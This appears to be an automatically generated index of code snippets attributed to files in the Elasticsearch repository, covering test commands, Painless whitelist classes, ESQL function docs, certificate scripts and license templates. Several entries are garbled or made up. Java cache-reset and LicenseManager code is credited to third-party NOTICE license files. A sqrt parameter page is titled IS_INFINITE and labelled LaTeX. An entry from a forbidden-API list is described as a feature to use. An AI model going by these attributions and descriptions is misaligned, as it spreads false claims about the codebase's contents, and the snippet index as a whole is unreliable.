network drive connector. They use the 'make' command to run tests on different dataset sizes, specifically a medium or small dataset, enabling efficient testing of the connector’s functionality. By default, a medium dataset is used, but including the 'DATA_SIZE' flag allows for faster tests with a smaller dataset.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-network-drive.md#2025-04-21_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ make ftest NAME=network_drive\n```\n\nLANGUAGE: Shell\nCODE:\n```\nmake ftest NAME=network_drive DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable for Credentials\nDESCRIPTION: This shell command sets an environment variable `eql_test_credentials_file` pointing to a local service account credentials file necessary for accessing the GCS bucket where the dataset is stored. This is required to execute the correctness tests locally.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nexport eql_test_credentials_file=/Users/username/credentials.gcs.json\n```\n\n----------------------------------------\n\nTITLE: Documenting 'number' Parameter for ESQL Function\nDESCRIPTION: Describes the 'number' parameter for an ESQL function. It specifies that the input can be a single- or multi-valued column or an expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_aggregate_metric_double.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`number`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Writing YAML REST Test for Custom Token Filter\nDESCRIPTION: This YAML file defines a REST test for the custom 'hello_world' token filter. It uses the indices.analyze API to verify the filter's behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n## Sample rest test\n---\n\"Hello world plugin test - removes all tokens except hello and world\":\n  - do:\n      indices.analyze:\n        body:\n          text: hello to everyone except the world\n          tokenizer: standard\n          filter:\n            - type: \"hello_world\"\n  - length: { tokens: 2 }\n  - match:  { tokens.0.token: \"hello\" }\n  - match:  { tokens.1.token: \"world\" }\n```\n\n----------------------------------------\n\nTITLE: Defining Vector Fields for Elasticsearch RankScripts in Java\nDESCRIPTION: These classes define vector fields used in Elasticsearch RankScripts. The vectors support various mathematical operations and data retrieval methods, used typically in rank-based queries and operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.fields.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.vectors.RankVectors {\n    RankVectors EMPTY\n    float[] getMagnitudes()\n\n    Iterator getVectors()\n    boolean isEmpty()\n    int getDims()\n    int size()\n}\n\nclass org.elasticsearch.script.field.vectors.DenseVector {\n    DenseVector EMPTY\n    float getMagnitude()\n\n    double dotProduct(Object)\n    double l1Norm(Object)\n    double l2Norm(Object)\n    double cosineSimilarity(Object)\n\n    float[] getVector()\n    boolean isEmpty()\n    int getDims()\n    int size()\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Test Fixtures Dependency Using Shortcut Method\nDESCRIPTION: Example of how to add test fixtures from another project using the testArtifact shortcut method in Gradle dependencies block.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_6\n\nLANGUAGE: groovy\nCODE:\n```\ndependencies {\n  //add the test fixtures of `:providing-project` to testImplementation configuration.\n  testImplementation(testArtifact(project(\":fixture-providing-project\")))\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Function String Parameter\nDESCRIPTION: Documentation block defining a string parameter for an ESQL function. The parameter accepts string expressions and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/trim.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nstring\n:   String expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Creating GCE Machine with knife google and Required Permissions\nDESCRIPTION: Example of using knife google to create a server with the necessary compute permissions for the Elasticsearch GCE discovery plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-tips.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nknife google server create www1 \\\n    -m n1-standard-1 \\\n    -I debian-8 \\\n    -Z us-central1-a \\\n    -i ~/.ssh/id_rsa \\\n    -x jdoe \\\n    --gce-service-account-scopes https://www.googleapis.com/auth/compute\n```\n\n----------------------------------------\n\nTITLE: Downloading Sample Configuration File using Curl\nDESCRIPTION: This snippet demonstrates how to download a sample configuration file for the Elastic network drive connector using the curl command. It specifies the output directory where the configuration file will be saved.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-network-drive.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Example of SSL Certificate for GitHub Connector\nDESCRIPTION: Presents a sample SSL certificate used to secure connections to the GitHub instance if SSL is enabled. Typically ignored if SSL verification is disabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n-----BEGIN CERTIFICATE-----\nMIID+jCCAuKgAwIBAgIGAJJMzlxLMA0GCSqGSIb3DQEBCwUAMHoxCzAJBgNVBAYT\n...\n7RhLQyWn2u00L7/9Omw=\n-----END CERTIFICATE-----\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Reset Logic in Elasticsearch\nDESCRIPTION: This snippet defines a method for resetting a cache that handles empty cache conditions. It uses a volatile field for thread visibility and provides a conditional reset mechanism based on the current thread's activity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/gax-httpjson-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nprivate volatile boolean resetRequested; // Flag to indicate if a reset has been requested\n\n@Override\npublic void resetCache() {\n    // Check if the cache is empty\n    if (this.entries.isEmpty()) {\n        // If empty, no need to reset - just clear the flag\n        resetRequested = false;\n        return;\n    }\n    // Otherwise, set flag to reset the cache later\n    resetRequested = true;\n}\n```\n\n----------------------------------------\n\nTITLE: Generating CA-signed Elasticsearch certificates\nDESCRIPTION: This script generates CA-signed certificates for Elasticsearch nodes. It copies the CA certificate and key, generates the certificates using `elasticsearch-certutil`, and copies the generated certificates and keys to the specified test resources directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/readme.md#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nrm -rf /tmp/certs; mkdir /tmp/certs; rm -rf local-ca\ncp $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/ca.crt .\ncp $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/ca.key .\nbin/elasticsearch-certutil cert --pem --silent --in instances.yml --out /tmp/certs/ca.zip --days 7300 --ca-key ca.key --ca-cert ca.crt\nunzip /tmp/certs/ca.zip -d ./local-ca\ncp -r ./local-ca/n*/*.crt $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/ca-signed\ncp -r ./local-ca/n*/*.key $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/ca-signed\n```\n\n----------------------------------------\n\nTITLE: Configuring a Test Task with Test Cluster\nDESCRIPTION: Example of registering a RestIntegTestTask and configuring it to use a previously registered test cluster. Shows how to wire a test cluster provider into a TestClusterAware task.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_5\n\nLANGUAGE: groovy\nCODE:\n```\ntasks.register('someClusterTest', RestIntegTestTask) {\n    useCluster someClusterProvider\n    nonInputProperties.systemProperty 'tests.leader_host', \"${-> someClusterProvider.get().getAllHttpSocketURI().get(0)}\"\n}\n```\n\n----------------------------------------\n\nTITLE: String Augmentation Methods Definition\nDESCRIPTION: Defines cryptographic hash methods available for String manipulation in Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ingest.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.String {\n  String org.elasticsearch.painless.api.Augmentation sha1()\n  String org.elasticsearch.painless.api.Augmentation sha256()\n  String org.elasticsearch.painless.api.Augmentation sha512()\n}\n```\n\n----------------------------------------\n\nTITLE: Using EXPM1 Function in Elasticsearch SQL\nDESCRIPTION: Returns Euler's number raised to the power of the input minus 1 (e^x - 1). The function takes a float input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nEXPM1(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Defining LicenseManager class for Elasticsearch license management in Java\nDESCRIPTION: This snippet outlines the LicenseManager class, which handles license management operations in Elasticsearch. It includes methods for registering and unregistering license state listeners, as well as managing the license state.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ql/licenses/antlr4-runtime-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\npublic class LicenseManager implements ClusterStateListener {\n    private static final Logger logger = LogManager.getLogger(LicenseManager.class);\n\n    private final Settings settings;\n    private final ClusterService clusterService;\n    private final LicenseState licenseState;\n    private final StartupSelfCheck startupSelfCheck;\n\n    private ScheduledExecutorService scheduler;\n\n    public LicenseManager(Settings settings, ClusterService clusterService, ThreadPool threadPool) {\n        this.settings = settings;\n        this.clusterService = clusterService;\n        this.licenseState = new LicenseState(() -> clusterService.state());\n        this.startupSelfCheck = new StartupSelfCheck(licenseState, threadPool);\n    }\n\n    public void registerLicenseStateListener(LicenseStateListener listener) {\n        licenseState.registerListener(listener);\n    }\n\n    public void unregisterLicenseStateListener(LicenseStateListener listener) {\n        licenseState.unregisterListener(listener);\n    }\n\n    // ... more methods ...\n}\n```\n\n----------------------------------------\n\nTITLE: Generating IntelliJ Checkstyle Configuration\nDESCRIPTION: Gradle command to manually generate IntelliJ-specific Checkstyle configuration file when it gets removed due to a clean operation or other actions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew configureIdeCheckstyle\n```\n\n----------------------------------------\n\nTITLE: Whitelist CompositeFieldScript.Factory Class in Painless\nDESCRIPTION: This snippet whitelists the `org.elasticsearch.script.CompositeFieldScript$Factory` class in Painless, preventing direct import. This factory class is used for creating instances of composite field scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.composite_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\n\"class org.elasticsearch.script.CompositeFieldScript$Factory @no_import {\n}\"\n```\n\n----------------------------------------\n\nTITLE: Binding and Reverting with LDAPConnectionPool using BindRequest\nDESCRIPTION: This method allows binding using a BindRequest with an LDAPConnectionPool instance and facilitates reverting to previous authentication. It's useful for temporary authentication scenarios.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/ldap-signatures.txt#2025-04-21_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\ncom.unboundid.ldap.sdk.LDAPConnectionPool#bindAndRevertAuthentication(com.unboundid.ldap.sdk.BindRequest)\n```\n\n----------------------------------------\n\nTITLE: End-to-end Testing Command - Shell\nDESCRIPTION: This shell command is used to run functional tests for the Notion connector using Docker Compose. It doesn’t require a running Elasticsearch instance to facilitate testing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=notion\n```\n\n----------------------------------------\n\nTITLE: Defining BaseStream Interface in Painless - Java\nDESCRIPTION: Defines the BaseStream interface in Java, outlining its methods such as close, isParallel, and others. It serves as the foundation for stream operations, providing essential behaviors like sequential processing and unordered traversal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.BaseStream {\n  void close()\n  boolean isParallel()\n  Iterator iterator()\n  BaseStream sequential()\n  Spliterator spliterator()\n  BaseStream unordered()\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Server Layer Entitlement in Java\nDESCRIPTION: Demonstrates how to add a new entitlement to a server layer scope by creating a Scope and adding an Entitlement instance\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/README.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nnew Scope(\n   \"org.apache.lucene.misc\",\n    List.of(\n       new FilesEntitlement(List.of(FileData.ofRelativePath(Path.of(\"\"), DATA, READ_WRITE))),\n       new ReadStoreAttributesEntitlement() // <- add this new entitlement\n    )\n)\n```\n\n----------------------------------------\n\nTITLE: TRACE Level Logging Example in Elasticsearch (Java)\nDESCRIPTION: Shows an example of TRACE level logging in Elasticsearch, used for detailed debugging information typically only needed by developers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_14\n\nLANGUAGE: java\nCODE:\n```\nlogger.trace(\"starting async refresh\");\n// ...\nlogger.trace(\"received node stats response\");\n// ...\nlogger.trace(\"received indices stats response\");\n// ...\nlogger.trace(\"stats all received, computing cluster info and notifying listeners\");\n// ...\nlogger.trace(\"notifying [{}] of new cluster info\", listener);\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index for Version 5 in JSON\nDESCRIPTION: Defines an Elasticsearch index with settings for shards and replicas, and mappings for document fields including title, created_at, and views.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"number_of_shards\": 1,\n    \"number_of_replicas\": 1\n  },\n  \"mappings\": {\n    \"my_type\": {\n      \"properties\": {\n        \"title\": {\n          \"type\": \"text\"\n        },\n        \"created_at\": {\n          \"type\": \"date\"\n        },\n        \"views\": {\n          \"type\": \"integer\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Duration Field Parameter Documentation\nDESCRIPTION: Documentation block defining the 'field' parameter that accepts a constant time duration expression as input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_timeduration.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`field`\n:   Input value. The input is a valid constant time duration expression.\n```\n\n----------------------------------------\n\nTITLE: Exporting Certificate from PKCS#12 to PEM\nDESCRIPTION: Function to export just the certificate from a PKCS#12 file to PEM format using keytool's exportcert command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nfunction p12-export-cert() {\n    local P12File=\"$1\"\n    local P12Pass=\"$2\"\n    local P12Name=\"$3\"\n    local PemFile=\"$4\"\n    \n    keytool -exportcert -keystore \"${PWD}/$P12File\" -storepass \"$P12Pass\" -alias \"$P12Name\" \\\n        -rfc -file \"${PWD}/$PemFile\" \n}\n```\n\n----------------------------------------\n\nTITLE: Defining FormatStyle Enum in Java\nDESCRIPTION: The FormatStyle enum defines the various styles for formatting dates and times, including FULL, LONG, MEDIUM, and SHORT. It provides utility methods to retrieve enum values by their string representation and to obtain an array of all enum values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.FormatStyle {\n  FormatStyle FULL\n  FormatStyle LONG\n  FormatStyle MEDIUM\n  FormatStyle SHORT\n  FormatStyle valueOf(String)\n  FormatStyle[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IS_INFINITE Function Parameters in LaTeX\nDESCRIPTION: This snippet defines the parameters for the IS_INFINITE function in ES|QL. It specifically documents that the function accepts a numeric expression parameter and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/sqrt.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Defining WildcardDocValuesField Class in Java for Elasticsearch\nDESCRIPTION: This snippet declares the WildcardDocValuesField class within the org.elasticsearch.xpack.wildcard package. The @dynamic_type annotation suggests that this class may have dynamic type characteristics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/wildcard/src/main/resources/org/elasticsearch/xpack/wildcard/org.elasticsearch.xpack.wildcard.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.xpack.wildcard.WildcardDocValuesField @dynamic_type {\n}\n```\n\n----------------------------------------\n\nTITLE: MPL 2.0 Source Code License Notice Template\nDESCRIPTION: Standard notice text that must be included in source code files to indicate they are licensed under MPL 2.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/rest/licenses/httpclient-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nThis Source Code Form is subject to the terms of the Mozilla Public\\nLicense, v. 2.0. If a copy of the MPL was not distributed with this\\nfile, You can obtain one at http://mozilla.org/MPL/2.0/.\n```\n\n----------------------------------------\n\nTITLE: Stable API Response Key-Value Mapping\nDESCRIPTION: This snippet demonstrates how to annotate an API response as a key-value map in a stable state, which is crucial for handling responses flexibly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/README.markdown#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"api.name\": {\n    \"stability\" : \"stable\",\n    \"response\": {\n      \"treat_json_as_key_value\" : true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Stream.Builder Interface in Painless - Java\nDESCRIPTION: Defines the Stream.Builder class for incremental creation of object streams. It enables adding elements individually and then building the composite stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.Stream$Builder {\n  Stream.Builder add(def)\n  Stream build()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IntervalDayTime Class for SQL Scripting in Java\nDESCRIPTION: This snippet defines the IntervalDayTime class from the org.elasticsearch.xpack.sql.expression.literal.interval package for use in SQL scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/main/resources/org/elasticsearch/xpack/sql/plugin/sql_whitelist.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.sql.expression.literal.interval.IntervalDayTime {\n}\n```\n\n----------------------------------------\n\nTITLE: Commenting Large Elasticsearch Request Example in YAML\nDESCRIPTION: This snippet shows a commented-out example of a large request that Kibana accidentally sent to Elasticsearch. It's used as a reference for understanding and potentially optimizing large request handling in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# These come from a request kibana once accidentally sent to ES. ES rejected the\n# request because it was too large. It really is quite large, but we should be\n```\n\n----------------------------------------\n\nTITLE: Defining Token Class Methods - Java\nDESCRIPTION: This snippet defines a class named Token that includes various methods for accessing properties of a token in a text analysis context. It provides functionality to get the token's term, position, length, offsets, and type, as well as to check if it is a keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/analysis-common/src/main/resources/org/elasticsearch/analysis/common/painless_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.analysis.common.AnalysisPredicateScript$Token {\n  CharSequence getTerm()\n  int getPosition()\n  int getPositionIncrement()\n  int getPositionLength()\n  int getStartOffset()\n  int getEndOffset()\n  String getType()\n  boolean isKeyword()\n}\n```\n\n----------------------------------------\n\nTITLE: Scripted Metric Aggregation State After Map Script\nDESCRIPTION: This JavaScript snippet shows the state of the scripted metric aggregation after the map_script is executed on each document in both shards.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n// Shard A\n\"state\" : {\n    \"transactions\" : [ 80, -30 ]\n}\n\n// Shard B\n\"state\" : {\n    \"transactions\" : [ -10, 130 ]\n}\n```\n\n----------------------------------------\n\nTITLE: Describing ADD Function Behavior in ESQL\nDESCRIPTION: Explains the functionality of the ADD (+) function in ESQL, including its behavior with multivalued fields. The function adds two numbers together, but returns null if either field is multivalued.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/add.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### ADD `+`\nAdd two numbers together. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n```\n\n----------------------------------------\n\nTITLE: MPL Secondary License Incompatibility Notice\nDESCRIPTION: Notice template for declaring source code as incompatible with secondary licenses under MPL v2.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-url/licenses/httpclient-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nThis Source Code Form is \"Incompatible With Secondary Licenses\", as\\ndefined by the Mozilla Public License, v. 2.0.\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Definition\nDESCRIPTION: Defines a required numeric parameter for an ESQL math function test case. The parameter accepts numeric expressions and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/cosh.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Describing ESQL Function for Sorting Multivalued Fields\nDESCRIPTION: This comment block describes an ESQL function that sorts multivalued fields in lexicographical order. It is part of an automatically generated test case file for Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_sort.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nSorts a multivalued field in lexicographical order.\n```\n\n----------------------------------------\n\nTITLE: GPL License Header Template\nDESCRIPTION: Template for the copyright and license header that should be included at the start of source files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/jakarta.mail-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: Standard copyright and license notice text to be included in software projects using the Apache License 2.0. Includes placeholders for copyright year and owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-azure-classic/licenses/commons-lang-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice\nDESCRIPTION: Example of a short license notice to be displayed when an interactive program starts. Shows copyright information and commands to view warranty/conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-text-module-NOTICE.txt#2025-04-22_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Defining Forbidden URL Methods in Elasticsearch\nDESCRIPTION: Declaration of forbidden methods in java.net.URL class, recommending conversion to URI instead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Convert to URI\njava.net.URL#getPath()\njava.net.URL#getFile()\n```\n\n----------------------------------------\n\nTITLE: NestedDocument Operations Class Definition\nDESCRIPTION: Defines methods for handling nested documents within fields, including field access and manipulation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ingest.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.NestedDocument {\n    WriteField field(String)\n    Stream fields(String)\n    boolean isEmpty()\n    int size()\n    boolean exists()\n    void remove()\n}\n```\n\n----------------------------------------\n\nTITLE: Including ABS Function Syntax Diagram in Markdown\nDESCRIPTION: Embeds an SVG image showing the syntax diagram for the ABS function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/abs.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/abs.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Type Combinations for ESQL Power Function\nDESCRIPTION: This markdown table shows the supported input types for base and exponent, and the resulting output type for ESQL's power function. It covers combinations of double, integer, long, and unsigned_long types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/pow.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| base | exponent | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| double | unsigned_long | double |\n| integer | double | double |\n| integer | integer | double |\n| integer | long | double |\n| integer | unsigned_long | double |\n| long | double | double |\n| long | integer | double |\n| long | long | double |\n| long | unsigned_long | double |\n| unsigned_long | double | double |\n| unsigned_long | integer | double |\n| unsigned_long | long | double |\n| unsigned_long | unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Hashtable Class Definition in Java\nDESCRIPTION: This snippet defines the Hashtable class, which is a legacy collection class that implements the Map interface. It includes methods for key-value pair management with synchronized access.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_20\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Hashtable {\n  ()\n  (Map)\n  def clone()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Enum Class Methods in Java\nDESCRIPTION: This snippet shows the public methods of the java.lang.Enum class. It includes methods for comparing enums, getting their names, and ordinal values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Enum {\n  int compareTo(Enum)\n  String name()\n  int ordinal()\n}\n```\n\n----------------------------------------\n\nTITLE: SHA256 Function Documentation Header\nDESCRIPTION: The header comment and function title for the SHA256 function documentation generated by AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sha256.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% 